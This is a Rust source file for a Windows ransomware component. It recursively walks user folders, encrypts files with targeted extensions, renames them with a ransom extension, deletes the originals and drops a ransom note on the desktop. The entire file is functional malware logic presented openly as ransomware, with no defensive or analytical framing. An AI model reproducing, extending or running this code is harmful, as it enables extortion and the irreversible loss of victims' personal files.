// ==========================================================================//
//                           WALKER FOR RANSOMWARE                           //
// ==========================================================================//
// Unique file for the feature: ransomw

// ======================= IMPORTS ========================

extern crate winapi;

use crate::encryption::encrypt;
use std::ffi::CString;
use std::ffi::OsString;
use std::fs::File;
use std::io::Write;
use std::path::PathBuf;
use std::ptr::null_mut;
use std::{env, str};
use winapi::shared::minwindef::FILETIME;
use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::minwinbase::WIN32_FIND_DATAA;
use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};

include!("config.rs"); // DIR_NAMES && RANSOM_EXT && VALID_EXTENSIONS && RANSOM_NOTE

// ======================= FUNCTIONS ========================

// Gets the current Windows system's username
pub fn get_user_name() -> Result<String, std::io::Error> {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();
    unsafe {
        GetUserNameA(null_mut(), &mut size);
        buffer.resize(size as usize, 0i8);
        if GetUserNameA(buffer.as_mut_ptr(), &mut size) == 0 {
            return Err(std::io::Error::last_os_error());
        }
        buffer.resize((size - 1) as usize, 0); // Adjust size to remove null terminator
    }
    Ok(String::from_utf8_lossy(&buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>()).to_string())
}

// Traverses defined directories and performs encryption and note writing operations
pub fn walk_and_encrypt_directories(user_name: Vec<u8>) {
    for dir in DIR_NAMES.iter() {
        let full_path = format!(
            "C:\\Users\\{}\\{}",
            String::from_utf8_lossy(&user_name),
            dir
        );
        println!("Exploring: {}", full_path);
        encrypt_directory_contents(&full_path);
    }
}

// Encrypts files within a given directory
fn encrypt_directory_contents(dir_path: &str) {
    let full_path = CString::new(format!("{}\\*", dir_path)).unwrap();
    let _ = traverse_and_encrypt(full_path);
}

// Writes the ransom note on the user's desktop
pub fn write_ransom_note(user: &str) -> Result<(), std::io::Error> {
    let desktop_path = format!("C:\\Users\\{}\\Desktop", user);
    let note_path = format!("{}\\README.txt", desktop_path);
    let mut file = File::create(note_path)?;
    writeln!(&mut file, "{}", RANSOM_NOTE)?;
    Ok(())
}
// Handles recursive search and encryption of files within a directory
fn traverse_and_encrypt(dir_name: CString) -> Result<(), std::io::Error> {
    unsafe {
        // Initializes structure to store data of files found during search
        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
            dwFileAttributes: 0,
            ftCreationTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastAccessTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastWriteTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            nFileSizeHigh: 0,
            nFileSizeLow: 0,
            dwReserved0: 0,
            dwReserved1: 0,
            cFileName: [0i8; 260],
            cAlternateFileName: [0i8; 14],
        };

        // Attempts to find the first file in the specified directory
        let h_find: HANDLE = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        // Checks if the HANDLE is valid, otherwise ends the function
        if h_find == INVALID_HANDLE_VALUE {
            return Ok(()); // If the first file is not found, the function ends
        }

        loop {
            // Creates a buffer to store the name of the found file
            let mut name_buffer: Vec<u8> = Vec::new();
            // Copies the file name from WIN32_FIND_DATAA structure to buffer
            for byte in file_data.cFileName.iter() {
                if *byte == 0 {
                    break; // Stops copying if a null byte is found, indicating the end of the file name
                }
                name_buffer.push(*byte as u8);
            }

            // Checks if the found file is not a directory
            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                // Concatenates the file name to the path to get the full path
                let curr = dir_name.as_bytes();
                let new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();

                // Converts `new_dir` to a PathBuf for easy comparison
                let file_path = PathBuf::from(String::from_utf8_lossy(&new_dir).to_string());

                if file_path.exists() {
                    // Get the current executable's path
                    let current_exe_path =
                        env::current_exe().expect("Failed to get executable path");
                    println!("{:?}", current_exe_path);
                    // Compare paths normalizing possible differences
                    if current_exe_path.canonicalize().unwrap() == file_path.canonicalize().unwrap()
                    {
                        println!("The file being examined is the current executable");
                    }
                }

                // Finds the position of the last dot to get the file extension
                let dot_position = match new_dir.iter().rposition(|&x| x == b'.') {
                    Some(pos) => pos,
                    None => {
                        eprintln!("Error: No dot found in the file name");
                        return Ok(());
                    }
                };
                let mut extension: Vec<u8> = Vec::new();
                // Extracts the file extension
                for i in dot_position..new_dir.len() {
                    extension.push(new_dir[i]);
                }

                // Checks if the file extension is in the list of valid extensions
                if VALID_EXTENSIONS
                    .iter()
                    .any(|&x| CString::new(x).unwrap() == CString::new(&extension[..]).unwrap())
                {
                    // Prepares file names for encryption and subsequent original file deletion
                    let source_file_name = new_dir.clone();
                    let mut dest_file_name: Vec<u8> = Vec::new();
                    for byte in source_file_name.iter() {
                        dest_file_name.push(*byte);
                    }
                    // Adds custom extension for the encrypted file
                    for byte in format!(".{}", RANSOM_EXT).as_bytes().iter() {
                        dest_file_name.push(*byte);
                    }
                    // Calls the encryption function with the original and destination file names

                    let encrypt_result = encrypt(
                        CString::new(&source_file_name.clone()[..]).unwrap(),
                        CString::new(&dest_file_name[..]).unwrap(),
                    );
                    let source_file_str = match String::from_utf8(source_file_name) {
                        Ok(s) => s,
                        Err(_) => "Invalid UTF-8 in source file name".to_string(),
                    };

                    let dest_file_str = match String::from_utf8(dest_file_name) {
                        Ok(s) => s,
                        Err(_) => "Invalid UTF-8 in destination file name".to_string(),
                    };

                    println!("{} -> {}", source_file_str, dest_file_str);
                    // Delete the original file
                    if encrypt_result {
                        DeleteFileA(std::ffi::CStr::as_ptr(
                            &CString::new(
                                &[&curr[..curr.len() - 1], &name_buffer[..]].concat().clone()[..],
                            )
                            .unwrap(),
                        ));
                    }
                }
            } else {
                // If its directory
                let name_string = String::from_utf8(name_buffer.clone()).expect("Invalid UTF-8");
                let os_string = OsString::from(name_string);
                let name = os_string.to_string_lossy();

                // If is not directory '.' y '..'
                if !(name == "." || name == "..") {
                    let curr = dir_name.to_bytes_with_nul();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    new_dir.push(b'\\');
                    new_dir.extend_from_slice(b"*");
                    let _ = traverse_and_encrypt(CString::new(new_dir).unwrap());
                }
            }

            // Try to get next file
            if FindNextFileA(h_find, &mut file_data) == 0 {
                // if not, exit from loop
                break;
            }
        }
        // Close the HANDLE
        CloseHandle(h_find);
    }
    Ok(())
}
